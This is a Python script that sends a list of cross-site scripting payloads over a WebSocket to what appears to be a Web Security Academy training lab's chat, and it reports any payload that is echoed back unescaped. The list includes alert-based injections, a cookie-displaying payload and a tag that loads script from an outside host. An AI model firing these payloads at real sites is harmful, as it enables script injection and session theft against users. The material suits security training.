#!/usr/bin/env python3
import asyncio
import websockets
import json
from urllib.parse import urlparse

# Target WebSocket URL - extract from the chat page
TARGET_URL = "wss://0aea008c04ee47bfb12c399900bc0093.web-security-academy.net/chat"

# XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<meter onmouseover=alert(1)>1</meter>",
    "<details open ontoggle=alert(1)>",
    "<form><button formaction=javascript:alert(1)>X</button>",
    "javascript:alert(1)//",
    "<a href=javascript:alert(1)>click</a>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    'javascript:alert(1)',
    '<img src="x" onerror="alert(1)">',
    '<svg/onload=alert(1)>',
    '"-alert(1)-"',
    "'-alert(1)-'",
    '\'-alert(1)//',
    '</script><script>alert(1)</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(document.domain)</script>',
    '<<SCRIPT>alert(1);//<</SCRIPT>',
    '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
    '<IMG SRC=# onmouseover="alert(1)">',
    '<IMG SRC= onmouseover="alert(1)">',
    '<BODY ONLOAD=alert(1)>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">',
    '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
    '<<SCRIPT>alert(1)//<</SCRIPT>',
    '<iframe src=javascript:alert(1)>',
    '<embed src=javascript:alert(1)>',
]

async def test_xss_payload(url, payload, session_cookie=None):
    """Test a single XSS payload via WebSocket"""
    try:
        # Headers for the WebSocket connection
        headers = {}
        if session_cookie:
            headers['Cookie'] = session_cookie
        
        # Connect to WebSocket
        async with websockets.connect(url, extra_headers=headers) as websocket:
            print(f"[*] Testing payload: {payload[:50]}...")
            
            # Send the payload as a chat message
            # Adjust the message format based on what the chat expects
            message = {
                "message": payload
            }
            
            await websocket.send(json.dumps(message))
            
            # Wait for response
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                print(f"[+] Response received for payload: {payload[:30]}...")
                
                # Check if our payload appears unescaped in the response
                if payload in response or payload.replace('"', '\\"') in response:
                    print(f"[!!!] POTENTIAL XSS FOUND with payload: {payload}")
                    return True
            except asyncio.TimeoutError:
                print(f"[-] Timeout for payload: {payload[:30]}...")
            
    except Exception as e:
        print(f"[!] Error testing payload {payload[:30]}: {str(e)}")
    
    return False

async def main():
    """Main function to test all payloads"""
    print(f"[*] Starting WebSocket XSS testing on {TARGET_URL}")
    print(f"[*] Testing {len(XSS_PAYLOADS)} payloads...")
    print("-" * 50)
    
    successful_payloads = []
    
    # Optional: Add your session cookie here if needed
    session_cookie = None  # e.g., "session=your-session-cookie-here"
    
    for payload in XSS_PAYLOADS:
        success = await test_xss_payload(TARGET_URL, payload, session_cookie)
        if success:
            successful_payloads.append(payload)
        
        # Small delay between requests to avoid rate limiting
        await asyncio.sleep(0.5)
    
    print("-" * 50)
    print(f"\n[*] Testing complete!")
    if successful_payloads:
        print(f"[+] Found {len(successful_payloads)} potential XSS vulnerabilities:")
        for payload in successful_payloads:
            print(f"    - {payload}")
    else:
        print("[-] No XSS vulnerabilities found with these payloads")

if __name__ == "__main__":
    # Note: You might need to install websockets: pip install websockets
    asyncio.run(main())